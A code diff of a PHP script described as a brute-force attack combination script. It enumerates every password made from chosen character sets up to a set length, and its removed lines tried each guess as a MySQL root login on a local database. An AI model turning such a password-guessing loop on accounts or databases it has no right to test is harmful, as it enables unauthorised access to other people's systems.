@@ -1,40 +1,30 @@
 <?php
 	/*
-	brute force attack
+	brute force attack combination script
 	*/
-	error_reporting(0);
-	define('PASSWORD_MAX_LEN',11);
-	echo "Start\n";
 
-	function connection($password)
-	{
-		$hostname = "localhost";
-		$username = "root";
-		$database = "lbb_staging_old";
-		$port = "3306";
-		// Create connection
-		$conn = new mysqli($hostname, $username, $password, $database, $port);
-		return $conn;	
-	}
+	// init tokens
 
-	function check($pass_str)
-	{
-		$conn=connection($pass_str);
-		if($conn->connect_error)
-			return false;
-		else
-			return true;
-	}
+	require("database.php");
 
-	// init token
 	$tokens=array();
 
-	for($i=65;$i<=90;$i++)
-		$tokens[]=chr($i);
-	for($i=97;$i<=122;$i++)
-		$tokens[]=chr($i);
-	for($i=48;$i<=57;$i++)
-		$tokens[]=chr($i);
+	if(in_array('*', $token))
+		for($i=0;$i<=255;$i++)
+			$tokens[]=chr($i);
+	else
+	{
+		if(in_array('a', $token))
+			for($i=97;$i<=122;$i++)
+				$tokens[]=chr($i);
+		if(in_array('A', $token))
+			for($i=65;$i<=90;$i++)
+				$tokens[]=chr($i);
+		if(in_array('1', $token))
+			for($i=48;$i<=57;$i++)
+				$tokens[]=chr($i);
+	}
+	
 
 	$tokenLength=count($tokens);
 
@@ -52,11 +42,18 @@
 				gen($str.$tokens[$i],$len+1,$maxlen);
 	}
 
-	for($max=1;$max<=PASSWORD_MAX_LEN;$max++)
+	function start_crack()
 	{
-		for($i=0;$i<$tokenLength;$i++)
+		$max=PASSWORD_MAX_LEN;
+		if(TRY_ALL)
+			$max=1;
+
+		for(;$max<=PASSWORD_MAX_LEN;$max++)
 		{
-			gen($tokens[$i],1,$max);
+			for($i=0;$i<$tokenLength;$i++)
+			{
+				gen($tokens[$i],1,$max);
+			}
 		}
 	}
 ?>
